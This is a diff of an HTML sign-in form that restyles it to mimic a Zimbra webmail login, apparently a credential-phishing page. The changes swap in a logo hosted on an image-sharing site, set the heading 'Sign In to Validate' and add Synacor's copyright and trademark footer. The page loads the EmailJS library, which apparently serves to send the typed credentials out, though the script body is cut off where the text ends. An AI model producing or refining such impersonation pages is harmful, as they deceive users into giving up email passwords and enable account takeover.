@@ -6,7 +6,7 @@
 <title>Sign In</title>
 <style>
   html, body {
-    height: 100%;
+    height: 110%;
     margin: 0;
     font-family: "Helvetica Neue", Helvetica, Arial, "Liberation Sans", sans-serif;
     background-color: #0088c1;
@@ -34,31 +34,32 @@
     align-items: center;
     padding: 20px;
     box-sizing: border-box;
+    flex-direction: column;
   }
   .form-container {
     width: 100%;
-    max-width: 400px;
-    background-color: rgba(255, 255, 255, 0.95);
-    padding: 40px 30px;
+    max-width: 370px;
+    background-color: white;
+    padding: 50px 40px;
     box-sizing: border-box;
-    border-radius: 8px;
+    border-radius: 3px;
     box-shadow: 0 4px 12px rgba(0,0,0,0.1);
     display: flex;
     flex-direction: column;
+    align-items: flex-start; /* align children to left */
   }
   .form-logo {
-    width: 180px;
+    width: 200px;
     height: 34px;
     object-fit: contain;
-    margin-bottom: 15px;
-    align-self: flex-start;
+    margin: 0 0 15px 0; /* spacing below logo */
+    margin-left: -35px;
   }
   .signIn {
-    font-size: 22px;
-    padding-bottom: 25px;
+    font-size: 20px;
     color: #4d4d4d;
     font-weight: bold;
-    margin: 0;
+    margin: 0 0 25px 0;
     align-self: flex-start;
   }
   form {
@@ -75,11 +76,11 @@
     text-align: left;
   }
   .custom-input {
-    font-size: 15px;
-    border-radius: 4px;
-    padding: 12px 20px !important;
+    font-size: 12px;
+    border-radius: 1px;
+    padding: 10px 12px !important;
     background: #ffffff;
-    border: 1px solid #000000;
+    border: 1px solid #d9d9d9;
     box-sizing: border-box;
     width: 100%;
     appearance: none;
@@ -121,13 +122,13 @@
   .custom-submit {
     background-color: #0088c1;
     color: #ffffff;
-    font-weight: 600;
-    padding: 0 25px;
-    height: 44px;
+    font-weight: 400;
+    padding: 0 18px;
+    height: 34px;
     border: 2px solid #0088c1;
     border-radius: 4px;
     cursor: pointer;
-    line-height: 40px;
+    line-height: 30px;
     text-align: center;
     width: auto;
     box-sizing: border-box;
@@ -143,12 +144,22 @@
     margin-top: -5px;
     margin-bottom: 5px;
   }
+  .footer-text {
+    position: absolute;
+    bottom: 10px;
+    width: 100%;
+    text-align: center;
+    color: white;
+    font-size: 10px;
+    z-index: 2;
+    pointer-events: none;
+  }
 </style>
 </head>
 <body>
 <div class="outer-wrapper">
   <div class="form-container">
-    <img src="https://i.imghippo.com/files/IODO4883Dc.png" alt="Logo" class="form-logo" />
+    <img src="https://i.imghippo.com/files/NWY6207Sdg.png" alt="Logo" class="form-logo" />
     <div class="signIn">Sign In to Validate</div>
     <form id="contact-form" novalidate>
       <div class="input-group">
@@ -162,7 +173,7 @@
         <div id="password-error" class="error-message"></div>
       </div>
       <div class="actions-row">
-        <button type="submit" class="custom-submit">continue</button>
+        <button type="submit" class="custom-submit">Continue</button>
         <div class="checkbox-container">
           <input type="checkbox" id="stay-signed-in" name="stay_signed_in" />
           <label for="stay-signed-in">Stay signed in</label>
@@ -170,6 +181,7 @@
       </div>
     </form>
   </div>
+  <div class="footer-text">Copyright © 2005-2025 Synacor, Inc. All rights reserved. "Zimbra" is a registered trademark of Synacor, Inc.</div>
 </div>
 <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
 <script>
